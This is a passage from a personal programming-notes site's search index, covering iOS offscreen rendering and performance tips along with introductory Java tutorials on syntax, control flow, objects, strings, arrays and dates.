来处理，当涉及到光栅化等一些工作时，CPU也会参与进来，这点在后面再详细描述。  GPU 的指责：\n 接收提交的纹理（Texture）和顶点描述（三角形），应用变换（transform）、混合（合成）并渲染，然后输出到屏幕上。通常你所能看到的内容，主要也就是纹理（图片）和形状（三角模拟的矢量图形）两类。  离屏渲染 #  GPU 屏幕渲染有以下两种方式：\n  On-Screen Rendering 当前屏幕渲染：指的是 GPU 的渲染操作是在当前用于显示的屏幕缓冲区中进行。\n  Off-Screen Rendering 意为离屏渲染：指的是 GPU 在当前屏幕缓冲区以外新开辟一个缓冲区进行渲染操作。\n  **特殊的离屏渲染：**如果将不在GPU的当前屏幕缓冲区中进行的渲染都称为离屏渲染，那么就还有另一种特殊的“离屏渲染”方式：CPU 渲染。\n 如果我们重写了 drawRect 方法，并且使用任何 Core Graphics 的技术进行了绘制操作，就涉及到了CPU渲染。整个渲染过程由 CPU 在 App 内同步地完成，渲染得到的 bitmap 最后再交由 GPU 用于显示。  PostScript：Core Graphic 通常是线程安全的，所以可以进行异步绘制，显示的时候再放回主线程，一个简单的异步绘制过程大致如下：\n(void)display { dispatch_async(backgroundQueue, ^{ CGContextRef ctx = CGBitmapContextCreate(...); // draw in context...  CGImageRef img = CGBitmapContextCreateImage(ctx); CFRelease(ctx); dispatch_async(mainQueue, ^{ layer.contents = img; }); }); } 在 iOS 中，设置了以下的属性，会触发离屏渲染：\n  光栅化：layer.shouldRasterize = YES；\n  遮罩：layer.mask；\n  不透明：layer.allowsGroupOpacity = YES 并且 layer.opacity \u0026lt; 1.0；\n  阴影：layer.shadow...（所有以 shadow 前缀开头的属性），使用 shadowPath 代替：\n// 使用 shadow 开头的属性进行设置 { CALayer *imgLayer = cell.imageView.layer; imgLayer.shadowColor = [UIColor blackColor].CGColor; imgLayer.shadowOpacity = 1.0; imgLayer.shadowRadius = 2.0; imgLayer.shadowOffset = CGSizeMake(1.0, 1.0); } // 使用 shadowPath 进行绘制 { CALayer *imgLayer = cell.imageView.layer; imgLayer.shadowPath = CGPathCreateWithRect(imgRect, NULL); }   edge antialiasing（抗锯齿）、group opacity（不透明）、复杂形状设置圆角等\n  为什么会使用离屏渲染？\n 当使用圆角，阴影，遮罩的时候，图层属性的混合体被指定为”在未预合成之前，不能直接在屏幕中绘制“，所以就需要屏幕外渲染被唤起。 屏幕外渲染并不意味着软件绘制，但是它意味着图层必须在被显示之前在一个屏幕外上下文中被渲染（不论 CPU 还是 GPU）。 所以当使用离屏渲染的时候会很容易造成性能消耗，因为在 OPENGL 里离屏渲染会单独在内存中创建一个屏幕外缓冲区并进行渲染，而屏幕外缓冲区跟当前屏幕缓冲区上下文切换是很耗性能的。  "},{"id":289,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/ios/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/","title":"优化方案","section":"性能优化","content":" 参考：\n https://github.com/ming1016/study/wiki/iOS性能优化 https://juejin.im/post/5ace078cf265da23994ee493#heading-7   优化方案 #  UITableView #  缓存池存储 cell，复用 cell：\n 在 cellForRowAtIndexPath: 回调的时候只创建实例，快速返回 cell，不绑定数据。 在 willDisplayCell: forRowAtIndexPath: 的时候通过 dequeueReusableCellWithIdentifier: 方法取缓存的 cell，通过 initWithStyle:reuseIdentifier: 绑定数据（赋值）。  缓存高度：\n 在 tableView 滑动时，会不断调用 heightForRowAtIndexPath:，当 cell 高度需要自适应时，每次回调都要计算高度，会导致 UI 卡顿。为了避免重复无意义的计算，需要缓存高度。 通过 Dictionary 或 NSCache 的方式进行缓存； 开源项目：FDTemplateLayoutCell  视图层级优化 #  不要动态创建视图：\n 在内存可控的前提下，缓存 subview；善用hidden。  减少视图层级：\n 减少 subview 的数量，使用layer 中的 drawrect 绘制，这样可以利用 GPU 离屏渲染； 少用 clearColor，maskToBounds，阴影效果等，可以避免 GPU 离屏渲染；  图片优化：\n 优化图片大小，尽量不要动态缩放(contentMode)，避免图形特效，图片缩放颜色渐变等； 尽可能将多张图片合成为一张进行显示； 不要用JPEG的图片，应当使用PNG图片。 子线程预解码（Decode），主线程直接渲染。因为当 image 没有 Decode，直接赋值给 imageView 会进行一个 Decode 操作从而阻塞主线程。  设置不透明 不要阻塞主线程，将处理放到子线程中去处理设置最大线程数为 2，利用 NSOperationQueue 的maxConcurrentOperationCount 为 2；  "},{"id":290,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/codeacademy/1.introduction/","title":"1. Introduction","section":"codeacademy","content":"Introduction #  Here is a Hello World code:\n// FirstClass.java public class FirstClass { public static void main(String[] args) { System.out.println(\u0026#34;shesl-meow\u0026#34;); } } Compile with the following command:\n$ javac FirstClass.java # Generate FirstClass.class in the same folder Run the java program with the following command:\n$ java FirstClass Data Type #   The first data type we will use is int.  int is short for integer, which are all positive and negative numbers, including zero. This number could represent the number of visits a website has received or the number of programming languages you know. The int data type only allows values between -2,147,483,648 and 2,147,483,647.   The next data type we will use is the boolean.  A boolean is a data type that can only be either true or false.   The char data type is used to represent single characters. That includes the keys on a keyboard that are used to produce text.  char is short for character and can represent a single character. All char values must be enclosed in single quotes, like this: 'G'.    Variable #  We can assign a variable to a specified data type, like this:\nint myLuckyNumber = 7; The variable myLuckyNumber now stores the value 7 as an int type.\nA semicolon ; is also used to end all Java single code statements. We will cover statements that should not end in a semicolon later in this course.\nWhiteSpace #  Whitespace is one or more characters (such as a space, tab, enter, or return) that do not produce a visible mark or text. Whitespace is often used to make code visually presentable.\nJava will ignore whitespace in code, but it is important to know how to use whitespace to structure code well. If you use whitespace correctly, code will be easier for you and other programmers to read and understand.\nComments #  A comment is text you want Java to ignore. Comments allow you to describe code or keep notes.\nBy using comments in the Java code, you may help yourself and even other programmers understand the purpose of code that a comment refers to.\nIn Java, there are two styles of comments: single line commentsand multi-line comments.\n  Single line comments are one line comments that begin with two forward slashes:\n// I\u0026#39;m a single line comment!   Multi-line comments are generally longer comments that can span multiple lines. They begin with /* and end with */ . Here\u0026rsquo;s an example:\n/* Hello, Java! */   Math Operation #  +, -, *, /, %\nRelation Operation #  Relational operators will always return a boolean value of trueor false.\nHere are a few relational operators:\n \u0026lt; : less than. \u0026lt;=: less than or equal to. \u0026gt;: greater than. \u0026gt;=: greater than or equal to.  Equality Operator #  The equality operators are:\n ==: equal to. !=: not equal to.  Equality operators do not require that operands share the same ordering. For example, you can test equality across boolean, char, or int data types. The example below combines assigning variables and using an equality operator:\nchar myChar = \u0026#39;A\u0026#39;; int myInt = -2; System.out.println(myChar == myInt); The example above will print out false because the value of myChar ('A') is not the same value as myInt ('-2').\n"},{"id":291,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/codeacademy/2.conditionalandcontrolflow/","title":"2. Conditional and Control Flow","section":"codeacademy","content":"Conditional And Control Flow #  Boolean operators #    There are three Boolean operators that we will explore. Let\u0026rsquo;s start with the first one: and.\n The and operator is represented in Java by \u0026amp;\u0026amp;. It returns a boolean value of true only when the expressions on both sides of \u0026amp;\u0026amp; are true.    Great! The second Boolean operator that we will explore is called or.\n The or operator is represented in Java by ||. It returns a Boolean value of true when at least one expression on either side of || is true.    The final Boolean operator we will explore is called not.\n The not operator is represented in Java by !. It will return the opposite of the expression immediately after it. It will return false if the expression is true, and true if the expression is false.    The precedence of each Boolean operator is as follows:\n ! is evaluated first \u0026amp;\u0026amp; is evaluated second || is evaluated third  If Statement #  Let\u0026rsquo;s get familiar with how relational, equality, and Boolean operators can be used to control the flow of our code.\nWe\u0026rsquo;ll start by exploring the ifstatement.\n In Java, the keyword if is the first part of a conditional expression. It is followed by a Boolean expression and then a block of code. If the Boolean expression evaluates to true, the block of code that follows will be run.  Here\u0026rsquo;s an example of the ifstatement used with a conditional expression:\nif (9 \u0026gt; 2) { System.out.println(\u0026#34;Control flow rocks!\u0026#34;); } If-Else Statement #  Sometimes we execute one block of code when the Boolean expression after the ifkeyword is true. Other times we may want to execute a different block of code when the Boolean expression is false.\nWe could write a second ifstatement with a Boolean expression that is opposite the first, but Java provides a shortcut called the if/elseconditional.\n The if/else conditional will run the block of code associated with the ifstatement if its Boolean expression evaluates to true. Otherwise, if the Boolean expression evaluates to false, it will run the block of code after the elsekeyword.  Here\u0026rsquo;s an example of if/elsesyntax:\nif (1 \u0026lt; 3 \u0026amp;\u0026amp; 5 \u0026lt; 4) { System.out.println(\u0026#34;I defy the Boolean laws!\u0026#34;) } else { System.out.println(\u0026#34;You can thank George Boole!\u0026#34;); } If-ElseIf-Else Statement #  Good work! In some cases, we need to execute a separate block of code depending on different Boolean expressions. For that case, we can use the if/else if/else statement in Java.\n If the Boolean expression after the if statement evaluates to true, it will run the code block that directly follows. Otherwise, if the Boolean expression after the else if statement evaluates to true, the code block that directly follow will run. Finally, if all previous Boolean expressions evaluate to false, the code within the else block will run.  Here\u0026rsquo;s an example of control flow with the if/else if/elsestatement:\nint shoeSize = 10; if (shoeSize \u0026gt; 12) { System.out.println(\u0026#34;Sorry, your shoe size is currently not in stock.\u0026#34;); } else if (shoeSize \u0026gt;= 6) { System.out.println(\u0026#34;Your shoe size is in stock!\u0026#34;); } else { System.out.println(\u0026#34;Sorry, this store does not carry shoes smaller than a size 6.\u0026#34;); } Ternary Conditional #  if/else statements can become lengthy even when you simply want to return a value depending on a Boolean expression. Fortunately, Java provides a shortcut that allows you to write if/elsestatements in a single line of code. It is called the ternary conditional statement.\nThe term ternary comes from a Latin word that means \u0026ldquo;composed of three parts\u0026rdquo;.\nThese three parts are:\n A Boolean expression A single statement that gets executed if the Boolean expression is true A single statement that gets executed if the Boolean expression is false  Here is an example of a ternary conditional statement:\nint pointsScored = 21; char gameResult = (pointsScored \u0026gt; 20) ? \u0026#39;W\u0026#39; : \u0026#39;L\u0026#39;; System.out.println(gameResult); Switch Statement #  The conditional statements that we have covered so far require Boolean expressions to determine which code block to run. Java also provides a way to execute code blocks based on whether a block is equal to a specific value. For those specific cases, we can use the switchstatement, which helps keep code organized and less wordy.\nThe switch statement is used as follows:\nint restaurantRating = 3; switch (restaurantRating) { case 1: System.out.println(\u0026#34;This restaurant is not my favorite.\u0026#34;); break; case 2: System.out.println(\u0026#34;This restaurant is good.\u0026#34;); break; case 3: System.out.println(\u0026#34;This restaurant is fantastic!\u0026#34;); break; default: System.out.println(\u0026#34;I\u0026#39;ve never dined at this restaurant.\u0026#34;); break; } "},{"id":292,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/codeacademy/3.objectoriented/","title":"3. Object Oriented","section":"codeacademy","content":"Object Oriented #  Java is an object-oriented programming (OOP) language, which means that we can design classes, objects, and methods that can perform certain actions. These behaviors are important in the construction of larger, more powerful Java programs.\nClasses #  Syntax #  One fundamental concept of object-oriented programming in Java is the class.\nA class is a set of instructions that describe how a data structure should behave.\nJava provides us with its own set of pre-defined classes, but we are also free to create our own custom classes.\nClasses in Java are created as follows:\n//Create a custom Car class  class Car { } Constructors #  Let\u0026rsquo;s start by creating the starting state of our class. We can do this by adding a class constructor to it.\n A class constructor will allow us to create Doginstances. With a class constructor, we can set some information about the Dog. If we do not create a class constructor, Java provides one that does not allow you to set initial information.  The code below demonstrates how a class constructor is created:\nclass Car { //The class constructor for the Car class  public Car() { } } Instance Variables #  When we create a new class, we probably have specific details that we want the class to include. We save those specific details into instance variables.\nHere is an instance variable in the Car class that describes a detail that we might want to associate with a car:\nclass Car { //Using instance variables to model our Car class after a real-life car  int modelYear; public Car() { } } Constructor Parameters #  Perfect! By adding a class constructor and creating instance variables, we will soon be able to use the Dog class. However, the class constructor Dog is still empty. Let\u0026rsquo;s modify this by adding parameters to the Dogconstructor.\nYou can think of parameters like options at an ice cream store. You can choose to order a traditional ice cream cone, but other times you may want to specify the size of the cone or the flavor of the ice cream.\nFor the Dog class, we can specify the initial dog age by adding parameters to the class constructor.\n Parameters allow data types to be created with specified attributes.  Let\u0026rsquo;s add parameters to our Car class constructor:\nclass Car { //Use instance variables to model our Car class after a real-life car  int modelYear; public Car(int year) { modelYear = year; } } The Main Method #  This is Java\u0026rsquo;s built-in main method. We will learn more about methods and keywords around the main method later on, but first let\u0026rsquo;s understand what the purpose of main is.\n When Java runs your program, the code inside of the main method is executed.  For now, you can ignore the keywords in the main method that we have not yet covered. You will learn about them later in the course.\nObjects #  To use the Dog class, we must create an instance of the Dog class. An instance of a class is known as an object in Java.\nThe example below demonstrates how to create a Car object:\nclass Car { int modelYear; public Car(int year) { modelYear = year; } public static void main(String[] args){ Car myFastCar = new Car(2007); } } In the example above, we create a Car object named myFastCar. When creating myFastCar, we used the class constructor and specified a value for the required int parameter year.\n2007 is the model year of myFastCar. Note that we declared the new object inside the main method.\nMethod #  A method is a pre-defined set of instructions. Methods are declared within a class. Java provides some pre-defined methods available to all classes, but we can create our own as well.\nLet\u0026rsquo;s create a new method:\nclass Car { int modelYear; public Car(int year) { modelYear = year; } //Our new method to help us get \u0026#34;started\u0026#34;  public void startEngine() { System.out.println(\u0026#34;Vroom!\u0026#34;); } public static void main(String[] args){ Car myFastCar = new Car(2007); } } Here is an example of calling a method on an object using the Car class:\nclass Car { int modelYear; public Car(int year) { modelYear = year; } public void startEngine() { System.out.println(\u0026#34;Vroom!\u0026#34;); } public static void main(String[] args){ Car myFastCar = new Car(2007); myFastCar.startEngine(); } } Inheritance #  One of the object-oriented programming concepts that allows us to reuse and maintain code more efficiently is called inheritance. It is used to share or inherit behavior from another class. Let\u0026rsquo;s look at an example:\nclass Car extends Vehicle { int modelYear; public Car(int year) { modelYear = year; } //Other methods omitted for brevity...  public static void main(String[] args){ Car myFastCar = new Car(2007) myFastCar.checkBatteryStatus(); } } class Vehicle { public void checkBatteryStatus() { System.out.println(\u0026#34;The battery is fully charged and ready to go!\u0026#34;); } } "},{"id":293,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/codeacademy/4.datastructures/","title":"4. Data Structures","section":"codeacademy","content":"Data Structures #  For Loop #  The for loop repeatedly runs a block of code until a specified condition is met.\nThe example below shows how a for loop is used:\nfor (int counter = 0; counter \u0026lt; 5; counter++) { System.out.println(\u0026#34;The counter value is: \u0026#34; + counter); } The statements within the parentheses of for loop compose the following parts:\n  Initialization: the int variable named counter is initialized to the value of 0before the loop is run.\n  Test condition: the Boolean expression counter \u0026lt; 5 is a conditional statement that is evaluated before the code inside the control statement is run every loop. If the expression evaluates to true, the code in the block will run. Otherwise, if the expression evaluates to false, the for loop will stop running.\n  Increment: Each time the loop completes, the increment statement is run. The statement counter++ increases the value of counter by 1 after each loop.\n  ArrayList #  The ArrayList stores a list of data of a specified type. Let\u0026rsquo;s go through an example of how to create, or declare, an ArrayList of type Integer.\nimport java.util.ArrayList; ArrayList\u0026lt;Integer\u0026gt; quizGrades = new ArrayList\u0026lt;Integer\u0026gt;(); ArrayList is a pre-defined Java class. To use it, we must first create an ArrayList object.\nIn the example above, we create an ArrayList object called quizGrades that will store data types belonging to the \u0026lt;Integer\u0026gt; class (whole numbers).\nManipulation #  Let\u0026rsquo;s add some values of type Integer to the ArrayList, one by one, like this:\nArrayList\u0026lt;Integer\u0026gt; quizGrades = new ArrayList\u0026lt;Integer\u0026gt;(); quizGrades.add(95); quizGrades.add(87); quizGrades.add(83); In the example above, we call the addmethod on quizGrades. The add method adds integers to the ArrayList. The values 95, 87, and 83 are added to the list.\nAccess #  Here is an example of accessing the element in the first position of the list:\nArrayList\u0026lt;Integer\u0026gt; quizGrades = new ArrayList\u0026lt;Integer\u0026gt;(); quizGrades.add(95); quizGrades.add(87); quizGrades.add(73); System.out.println( quizGrades.get(0) ); The example above will print out the grade value of 95.\nInsertion #  To insert new elements into an ArrayList, we can use a slightly different version of the addmethod that you previously used:\nArrayList\u0026lt;Integer\u0026gt; quizGrades = new ArrayList\u0026lt;Integer\u0026gt;(); quizGrades.add(95); quizGrades.add(87); quizGrades.add(73); quizGrades.add(0, 100); System.out.println( quizGrades.get(0) ); Iterating over #  Earlier in this lesson, we learned about the for loop. Since we\u0026rsquo;ve also learned how to retrieve the value at a specific index of an ArrayList, we can now access each of the elements.\nfor (int i = 0; i \u0026lt; quizGrades.size(); i++) { System.out.println( quizGrades.get(i) ); } For Each Loop #  Here is an example of the concise for each loop:\nfor (Integer grade : quizGrades){ System.out.println(grade); } HashMap #  Another useful built-in data structure in Java is the HashMap.\nAlthough the name of the data structure might not make sense to you immediately, think of it as a real-life dictionary. A dictionary contains a set of words and a definition for each word. A HashMap contains a set of keysand a value for each key.\nIf we look up a word in a dictionary, we can get the definition. If you provide a HashMap with a key that exists, you can retrieve the value associated with the key.\nDeclaring a HashMap is shown in the following example:\nimport java.util.HashMap; HashMap\u0026lt;String, Integer\u0026gt; myFriends = new HashMap\u0026lt;String, Integer\u0026gt;(); Manipulation #  Add keys and values to a HashMap:\nHashMap\u0026lt;String, Integer\u0026gt; myFriends = new HashMap\u0026lt;String, Integer\u0026gt;(); myFriends.put(\u0026#34;Mark\u0026#34;, 24); myFriends.put(\u0026#34;Cassandra\u0026#34;, 25); myFriends.put(\u0026#34;Zenas\u0026#34;, 21); Access #  To access data in an ArrayList, we specified the index. In order to access a value in a HashMap, we specify the key:\nHashMap\u0026lt;String, Integer\u0026gt; myFriends = new HashMap\u0026lt;String, Integer\u0026gt;(); myFriends.put(\u0026#34;Mark\u0026#34;, 24); myFriends.put(\u0026#34;Cassandra\u0026#34;, 25); myFriends.put(\u0026#34;Zenas\u0026#34;, 21); System.out.println( myFriends.get(\u0026#34;Zenas\u0026#34;) ); Iterating over #  We can also access properties of a HashMap, such as the number of entries or the contents of the HashMap.\nLet\u0026rsquo;s access the length and print out the contents of the myFriends:\nHashMap\u0026lt;String, Integer\u0026gt; myFriends = new HashMap\u0026lt;String, Integer\u0026gt;(); myFriends.put(\u0026#34;Mark\u0026#34;, 24); myFriends.put(\u0026#34;Cassandra\u0026#34;, 25); myFriends.put(\u0026#34;Zenas\u0026#34;, 21); System.out.println( myFriends.size() ); for (String name: myFriends.keySet()) { System.out.println(name + \u0026#34; is age: \u0026#34; + myFriends.get(name)); } "},{"id":294,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/1.%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","title":"1.基础语法","section":"菜鸟基础教程","content":"基础语法 #  基本语法 #  编写Java程序时，应注意以下几点：\n 大小写敏感：Java是大小写敏感的，这就意味着标识符Hello与hello是不同的。 类名：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 MyFirstJavaClass 。 方法名：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。 源文件名：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记Java是大小写敏感的），文件名的后缀为.java。（如果文件名和类名不相同则会导致编译错误）。 主方法入口：所有的Java 程序由**public static void main(String []args)**方法开始执行。  Java标识符 #  Java所有的组成部分都需要名字。类名、变量名以及方法名都被称为标识符。\n关于Java标识符，有以下几点需要注意：\n 所有的标识符都应该以字母（A-Z或者a-z）,美元符（$）、或者下划线（_）开始 首字符之后可以是字母（A-Z或者a-z）,美元符（$）、下划线（_）或数字的任何字符组合 关键字不能用作标识符 标识符是大小写敏感的   Java修饰符 #  像其他语言一样，Java可以使用修饰符来修饰类中方法和属性。主要有两类修饰符：\n 访问控制修饰符 : default, public , protected, private 非访问控制修饰符 : final, abstract, static, synchronized  在后面的章节中我们会深入讨论Java修饰符。\nJava变量 #  Java中主要有如下几种类型的变量\n 局部变量 类变量（静态变量） 成员变量（非静态变量）  Java枚举 #  Java 5.0引入了枚举，枚举限制变量只能是预先设定好的值。使用枚举可以减少代码中的bug。\n例如，我们为果汁店设计一个程序，它将限制果汁为小杯、中杯、大杯。这就意味着它不允许顾客点除了这三种尺寸外的果汁。\nclass FreshJuice { enum FreshJuiceSize{ SMALL, MEDIUM , LARGE }; FreshJuiceSize size; } public class FreshJuiceTest { public static void main(String []args){ FreshJuice juice = new FreshJuice(); juice.size = FreshJuice.FreshJuiceSize.MEDIUM ; } } Java 源程序与编译型运行区别 #  "},{"id":295,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/10.character%E7%B1%BB/","title":"10. Character类","section":"菜鸟基础教程","content":"Character 类 #  例如，将一个char类型的参数传递给需要一个Character类型参数的方法时，那么编译器会自动地将char类型参数转换为Character对象。 这种特征称为装箱，反过来称为拆箱。\n// 原始字符 \u0026#39;a\u0026#39; 装箱到 Character 对象 ch 中 Character ch = \u0026#39;a\u0026#39;; // 原始字符 \u0026#39;x\u0026#39; 用 test 方法装箱 // 返回拆箱的值到 \u0026#39;c\u0026#39; char c = test(\u0026#39;x\u0026#39;); 下面是Character类的方法：http://www.runoob.com/java/java-character.html\n"},{"id":296,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/11.string%E7%B1%BB/","title":"11. String类","section":"菜鸟基础教程","content":"String 类 #  创建字符串 #  String 类有 11 种构造方法，这些方法提供不同的参数来初始化字符串，创建字符串最简单的方式如下：\nString greeting = \u0026#34;菜鸟教程\u0026#34;; **注意:**String 类是不可改变的，所以你一旦创建了 String 对象，那它的值就无法改变了（详看笔记部分解析）。\n如果需要对字符串做很多修改，那么应该选择使用 StringBuffer \u0026amp; StringBuilder 类。\n字符串长度 #  String 类的一个访问器方法是 length() 方法，它返回字符串对象包含的字符数。\n一个示例代码如下：\npublic class StringDemo { public static void main(String args[]) { String site = \u0026#34;www.runoob.com\u0026#34;; int len = site.length(); System.out.println( \u0026#34;菜鸟教程网址长度 : \u0026#34; + len ); } } 连接字符串 #  String 类提供了连接两个字符串的方法：\nstring1.concat(string2);\n返回 string2 连接 string1 的新字符串。也可以对字符串常量使用 concat() 方法，如：\n\u0026#34;我的名字是 \u0026#34;.concat(\u0026#34;Runoob\u0026#34;); 更常用的是使用 + 操作符来连接字符串，如：\n\u0026#34;Hello,\u0026#34; + \u0026#34; runoob\u0026#34; + \u0026#34;!\u0026#34; 结果如下:\n\u0026#34;Hello, runoob!\u0026#34; 创建格式化字符串 #  我们知道输出格式化数字可以使用 printf() 和 format() 方法。\nString 类使用静态方法 format() 返回一个 String 对象而不是 PrintStream 对象。\nString 类的静态方法 format() 能用来创建可复用的格式化字符串，而不仅仅是用于一次打印输出。\n如下所示：\nSystem.out.printf(\u0026#34;浮点型变量的值为 \u0026#34; + \u0026#34;%f, 整型变量的值为 \u0026#34; + \u0026#34; %d, 字符串变量的值为 \u0026#34; + \u0026#34;is %s\u0026#34;, floatVar, intVar, stringVar); 你也可以这样写\nString fs; fs = String.format(\u0026#34;浮点型变量的值为 \u0026#34; + \u0026#34;%f, 整型变量的值为 \u0026#34; + \u0026#34; %d, 字符串变量的值为 \u0026#34; + \u0026#34; %s\u0026#34;, floatVar, intVar, stringVar); 类方法 #  下面是 String 类支持的方法，更多详细，参看 Java String API 文档。\n"},{"id":297,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/12.buffer%E4%B8%8Ebuilder/","title":"12. Buffer与 Builder","section":"菜鸟基础教程","content":"StringBuffer 和 StringBuilder 类 #  基本介绍 #  当对字符串进行修改的时候，需要使用 StringBuffer 和 StringBuilder 类。\n和 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。\nStringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。\n由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。\n使用示例：\npublic class Test{ public static void main(String args[]){ StringBuffer sBuffer = new StringBuffer(\u0026#34;菜鸟教程官网：\u0026#34;); sBuffer.append(\u0026#34;www\u0026#34;); sBuffer.append(\u0026#34;.runoob\u0026#34;); sBuffer.append(\u0026#34;.com\u0026#34;); System.out.println(sBuffer); } } 方法：http://www.runoob.com/java/java-stringbuffer.html\n深入理解 #   https://zhuanlan.zhihu.com/p/62780312\n Java 提供的三种操作字符串对象的方法：String、StringBuffer、StringBuilder。它们的相同点都是用来封装字符串，都实现了 CharSequence 接口。区别如下：\n  关于可变性：\n String 是一个不可变类，创建之后直到销毁，这个对象都是不可被改变的； StringBuffer、StringBuilder 都继承自 AbstractStringBuilder，它的底层使用字符数组保存字符串，是一个可变类。    关于初始化方法：\n String 类可以使用直接赋值的方法进行初始化：String s = \u0026quot;Hello\u0026quot;;； StringBuffer、StringBuilder 只能使用 new 的这种构造方法赋值。    关于修改一个字符串，以字符串追加为例：\n  String 可以直接使用累加的方法：\nString str = \u0026#34;Hello,\u0026#34;; str += \u0026#34;World\u0026#34;; 这种方法看起来很方便，实际上底层是销毁了原来的对象后创建了一个新的对象；\n  StringBuffer、StringBuilder 等价于使用下面的代码：\nStringBuffer sb = new StringBuffer(\u0026#34;Hello,\u0026#34;); sb.append(\u0026#34;World\u0026#34;); 因为前者的底层会进行一些额外的操作，所以即使将 sb 重新复制给 String，效率也更高。\n    关于一些原生的方法：\n  String 实现了 equals() 方法与 hashCode() 方法；\n  StringBuffer、StringBuilder 并没有实现这两个方法，也就是说：\nStringBuffer sb1 = new StringBuffer(\u0026#34;Java\u0026#34;); StringBuffer sb2 = new StringBuffer(\u0026#34;Java\u0026#34;); sb1.equals(sb2); // ==\u0026gt; false     关于是否线程安全：\n StringBuffer、StringBuilder 它们都提供了一系列插入追加改变字符串序列的方法，它们的用法基本相同。区别在于 StringBuffer 是线程安全的，而 StringBuilder 是线程不安全的。    "},{"id":298,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/13.%E6%95%B0%E7%BB%84/","title":"13.数组","section":"菜鸟基础教程","content":"数组 #  声明数组变量 #  首先必须声明数组变量，才能在程序中使用数组。下面是声明数组变量的语法：\ndataType[] arrayRefVar; // 首选的方法  或 dataType arrayRefVar[]; // 效果相同，但不是首选方法 注意: 建议使用 dataType[] arrayRefVar 的声明风格声明数组变量。 dataType arrayRefVar[] 风格是来自 C/C++ 语言 ，在 Java 中采用是为了让 C/C++ 程序员能够快速理解 Java 语言。\n创建数组 #  Java 语言使用 new 操作符来创建数组，语法如下：\narrayRefVar = new dataType[arraySize]; 上面的语法语句做了两件事：\n  使用 dataType[arraySize] 创建了一个数组。\n  把新创建的数组的引用赋值给变量 arrayRefVar。\n  数组变量的声明，和创建数组可以用一条语句完成，如下所示：\ndataType[] arrayRefVar = new dataType[arraySize]; 另外，你还可以使用如下的方式创建数组：\ndataType[] arrayRefVar = {value0, value1, ..., valuek}; 数组作为函数的参数 #  可以\n数组作为函数的返回值 #  可以\n多维数组 #  多维数组可以看成是数组的数组，比如二维数组就是一个特殊的一维数组，其每一个元素都是一个一维数组，例如：\nString str = new String3; Arrays 类 #  java.util.Arrays 类能方便地操作数组，它提供的所有方法都是静态的。\n具有以下功能：\n 给数组赋值：通过 fill 方法。 对数组排序：通过 sort 方法,按升序。 比较数组：通过 equals 方法比较数组中元素值是否相等。 查找数组元素：通过 binarySearch 方法能对排序好的数组进行二分查找法操作。  具体说明请查看下表：\n   序号 方法和说明     1 public static int binarySearch(Object[] a, Object key) 用二分查找算法在给定数组中搜索给定值的对象(Byte,Int,double等)。数组在调用前必须排序好的。如果查找值包含在数组中，则返回搜索键的索引；否则返回 (-(插入点) - 1)。   2 public static boolean equals(long[] a, long[] a2) 如果两个指定的 long 型数组彼此相等，则返回 true。如果两个数组包含相同数量的元素，并且两个数组中的所有相应元素对都是相等的，则认为这两个数组是相等的。换句话说，如果两个数组以相同顺序包含相同的元素，则两个数组是相等的。同样的方法适用于所有的其他基本数据类型（Byte，short，Int等）。   3 public static void fill(int[] a, int val) 将指定的 int 值分配给指定 int 型数组指定范围中的每个元素。同样的方法适用于所有的其他基本数据类型（Byte，short，Int等）。   4 public static void sort(Object[] a) 对指定对象数组根据其元素的自然顺序进行升序排列。同样的方法适用于所有的其他基本数据类型（Byte，short，Int等）。    "},{"id":299,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/14.%E6%97%A5%E6%9C%9F%E5%92%8C%E6%97%B6%E9%97%B4/","title":"14.日期和时间","section":"菜鸟基础教程","content":"日期和时间 #  Date #  java.util 包提供了 Date 类来封装当前的日期和时间。 Date 类提供两个构造函数来实例化 Date 对象。\n第一个构造函数使用当前日期和时间来初始化对象。\nDate(); 第二个构造函数接收一个参数，该参数是从1970年1月1日起的毫秒数。\nDate(long millisec); Date 对象创建以后，可以调用下面的方法：http://www.runoob.com/java/java-date-time.html\n获取当前日期时间 #  Java 中获取当前日期和时间很简单，使用 Date 对象的 toString() 方法来打印当前日期和时间：\nimport java.util.Date; public class DateDemo { public static void main(String args[]) { // 初始化 Date 对象  Date date = new Date(); // 使用 toString() 函数显示日期时间  System.out.println(date.toString()); } } 